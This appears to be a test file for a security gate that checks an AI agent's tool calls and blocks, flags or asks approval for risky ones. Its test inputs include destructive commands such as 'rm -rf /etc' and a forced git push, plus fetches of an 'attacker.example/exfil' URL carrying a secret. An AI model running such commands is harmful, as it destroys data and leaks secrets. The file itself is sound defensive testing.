import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync, mkdirSync, writeFileSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';
import { toDescriptor, decideHook, failsafeOutcome } from '../../../src/hooks/hook-action-gate';
import { fingerprint } from '../../../src/security/action-gate';
import type { ActionGateConfig, ApprovalPolicy } from '../../../src/security/policy';
import { resolvePaths } from '../../../src/utils/paths';
import type { Approval, BusPaths } from '../../../src/types';

describe('hook-action-gate: toDescriptor (maps tool calls; NO-THROW)', () => {
  it('Bash ⇒ bash descriptor with the command', () => {
    expect(toDescriptor('Bash', { command: 'rm -rf /x' })).toEqual({ kind: 'bash', command: 'rm -rf /x' });
  });
  it('Write/Edit ⇒ write/edit with path + content binding', () => {
    expect(toDescriptor('Write', { file_path: '.env', content: 'SECRET=1' })).toEqual({ kind: 'write', path: '.env', content: 'SECRET=1' });
    expect(toDescriptor('Edit', { file_path: 'config.json', new_string: 'x' })).toEqual({ kind: 'edit', path: 'config.json', content: 'x' });
  });
  it('MultiEdit ⇒ edit by file_path; content = concatenated new_strings (P1-1, no bypass)', () => {
    const d = toDescriptor('MultiEdit', {
      file_path: 'orgs/x/agents/y/.claude/settings.json',
      edits: [{ old_string: 'a', new_string: 'A' }, { old_string: 'b', new_string: 'B' }],
    });
    expect(d).toEqual({ kind: 'edit', path: 'orgs/x/agents/y/.claude/settings.json', content: 'A\nB' });
  });
  it('NotebookEdit ⇒ edit by notebook_path + new_source (P1-1, no bypass)', () => {
    expect(toDescriptor('NotebookEdit', { notebook_path: 'n.ipynb', new_source: 'print(1)' }))
      .toEqual({ kind: 'edit', path: 'n.ipynb', content: 'print(1)' });
  });
  it('WebFetch ⇒ web-fetch descriptor (external network surface, no allow-fast bypass)', () => {
    expect(toDescriptor('WebFetch', { url: 'https://attacker.example/exfil?x=1', prompt: 'summarize' }))
      .toEqual({ kind: 'web-fetch', url: 'https://attacker.example/exfil?x=1', prompt: 'summarize' });
  });
  it('non-mutating / unknown tools ⇒ null (allow fast)', () => {
    expect(toDescriptor('Read', { file_path: '.env' })).toBeNull();
    expect(toDescriptor('Grep', { pattern: 'x' })).toBeNull();
    expect(toDescriptor('Glob', {})).toBeNull();
    expect(toDescriptor('WebSearch', { query: 'x' })).toBeNull();
    expect(toDescriptor('SomethingNew', { file_path: 'x' })).toBeNull();
  });
  it('malformed / missing / non-string fields ⇒ null, never throws (P2-4)', () => {
    expect(toDescriptor('Bash', {})).toBeNull();
    expect(toDescriptor('Bash', { command: '' })).toBeNull();
    expect(toDescriptor('Bash', { command: 123 })).toBeNull();
    expect(toDescriptor('Write', {})).toBeNull();
    expect(toDescriptor('Write', { file_path: 42 })).toBeNull();
    expect(toDescriptor('WebFetch', {})).toBeNull();
    expect(toDescriptor('WebFetch', { url: 42 })).toBeNull();
    expect(toDescriptor('MultiEdit', { file_path: 'x', edits: 'not-an-array' })).toEqual({ kind: 'edit', path: 'x', content: undefined });
    expect(toDescriptor('Bash', null as unknown as object)).toBeNull();
    expect(() => toDescriptor('Bash', undefined as unknown as object)).not.toThrow();
  });
});

describe('hook-action-gate: decideHook (projects evaluateGate ⇒ HookOutcome)', () => {
  let testDir: string;
  let paths: BusPaths;
  const ORG = 'testorg';
  const AGENT = 'forge';
  beforeEach(() => { testDir = mkdtempSync(join(tmpdir(), 'hook-gate-')); paths = resolvePaths(AGENT, 'default', ORG, testDir); });
  afterEach(() => { rmSync(testDir, { recursive: true, force: true }); });

  const base = (config: ActionGateConfig, policy: ApprovalPolicy, descriptor: any) => ({
    paths, frameworkRoot: testDir, org: ORG, agent: AGENT, descriptor, configOverride: config, policyOverride: policy,
  });
  const POLICY: ApprovalPolicy = { always_ask: ['data-deletion', 'external-comms', 'config-change'], never_ask: [] };

  it('off mode ⇒ allow, no block', () => {
    const o = decideHook({ kind: 'bash', command: 'rm -rf /etc' }, base({ mode: 'off', enforce: [] }, POLICY, { kind: 'bash', command: 'rm -rf /etc' }));
    expect(o.block).toBe(false);
  });

  it('shadow ⇒ would-block but allows (block:false, decision.shadow)', () => {
    const d = { kind: 'bash', command: 'rm -rf /etc' };
    const o = decideHook(d, base({ mode: 'shadow', enforce: [] }, POLICY, d));
    expect(o.block).toBe(false);
    expect(o.decision.shadow).toBe(true);
    expect(o.decision.category).toBe('data-deletion');
  });

  it('enforce + gated + no approval ⇒ block with reason + notifyId', () => {
    const d = { kind: 'bash', command: 'rm -rf /etc' };
    const o = decideHook(d, base({ mode: 'enforce', enforce: ['data-deletion'] }, POLICY, d));
    expect(o.block).toBe(true);
    expect(o.reason).toMatch(/data-deletion/);
    expect(o.notifyId).toBeTruthy(); // a pending approval was created ⇒ notify target
  });

  it('enforce + an approved matching row ⇒ allow (single-use consume)', () => {
    const d = { kind: 'write', path: '.env', content: 'X=1' };
    // pre-seed an approved row whose fingerprint matches this exact action
    const fp = fingerprint('config-change', d);
    mkdirSync(join(paths.approvalDir, 'resolved'), { recursive: true });
    const row: Approval = {
      id: 'approval_ok', title: 't', requesting_agent: AGENT, org: ORG, category: 'config-change',
      status: 'approved', description: 'd', created_at: 'x', updated_at: 'x', resolved_at: null, resolved_by: null,
      action_fingerprint: fp, consumed_at: null,
    };
    writeFileSync(join(paths.approvalDir, 'resolved', 'approval_ok.json'), JSON.stringify(row));
    const o = decideHook(d, base({ mode: 'enforce', enforce: ['config-change'] }, POLICY, d));
    expect(o.block).toBe(false); // approved ⇒ consumed ⇒ allow
  });

  it('raw telegram curl in enforce ⇒ BLOCK (Option A: no curl owner-exemption — it is always external-comms)', () => {
    const d = { kind: 'bash', command: 'curl https://api.telegram.org/botX/sendMessage -d chat_id=999' };
    const o = decideHook(d, base({ mode: 'enforce', enforce: ['external-comms'] }, POLICY, d)); // ownerChatIds undefined
    expect(o.block).toBe(true); // raw curl→telegram is never owner-exempt; the never-freeze channel is the CLI
  });

  it('WebFetch in shadow ⇒ observes external-comms would-block but allows', () => {
    const d = { kind: 'web-fetch' as const, url: 'https://attacker.example/exfil?secret=1', prompt: 'summarize' };
    const o = decideHook(d, base({ mode: 'shadow', enforce: ['external-comms'] }, POLICY, d));
    expect(o.block).toBe(false);
    expect(o.decision.shadow).toBe(true);
    expect(o.decision.category).toBe('external-comms');
  });

  it('WebFetch in enforce ⇒ BLOCKS external-comms and creates an approval', () => {
    const d = { kind: 'web-fetch' as const, url: 'https://attacker.example/exfil?secret=1', prompt: 'summarize' };
    const o = decideHook(d, base({ mode: 'enforce', enforce: ['external-comms'] }, POLICY, d));
    expect(o.block).toBe(true);
    expect(o.reason).toMatch(/external-comms/);
    expect(o.notifyId).toBeTruthy();
  });

  it('owner-undeterminable bus send-telegram ⇒ allow (never freeze — the CLI is the owner channel)', () => {
    const d = { kind: 'bash', command: 'cortextos bus send-telegram 999 "hi"' };
    const o = decideHook(d, base({ mode: 'enforce', enforce: ['external-comms'] }, POLICY, d)); // ownerChatIds undefined
    expect(o.block).toBe(false); // CLI with no resolvable owner-list ⇒ never freeze the control channel
  });
});

describe('hook-action-gate: failsafeOutcome (hook-boundary fail-closed-on-catastrophic; P2-4)', () => {
  it('a POSITIVE catastrophic match ⇒ block (fail-closed)', () => {
    expect(failsafeOutcome({ kind: 'bash', command: 'rm -rf /etc' }, 'test').block).toBe(true);
    expect(failsafeOutcome({ kind: 'write', path: '.env', content: 'x' }, 'test').block).toBe(true); // config-change catastrophic
    expect(failsafeOutcome({ kind: 'bash', command: 'git push --force origin main' }, 'test').block).toBe(true);
  });
  it('a non-catastrophic match ⇒ allow (fail-open, never-freeze)', () => {
    // deployment is gated but NOT catastrophic ⇒ on a gate-error boundary it fails OPEN
    expect(failsafeOutcome({ kind: 'bash', command: 'gh pr merge 5 --squash' }, 'test').block).toBe(false);
  });
  it('a safe / unknown action ⇒ allow', () => {
    expect(failsafeOutcome({ kind: 'bash', command: 'ls -la' }, 'test').block).toBe(false);
    expect(failsafeOutcome({ kind: 'write', path: 'src/foo.ts', content: 'x' }, 'test').block).toBe(false);
  });
  it('owner-undeterminable telegram ⇒ allow (never freeze the owner channel on the error path)', () => {
    expect(failsafeOutcome({ kind: 'telegram', to: '999', text: 'x' }, 'test').block).toBe(false);
  });
});
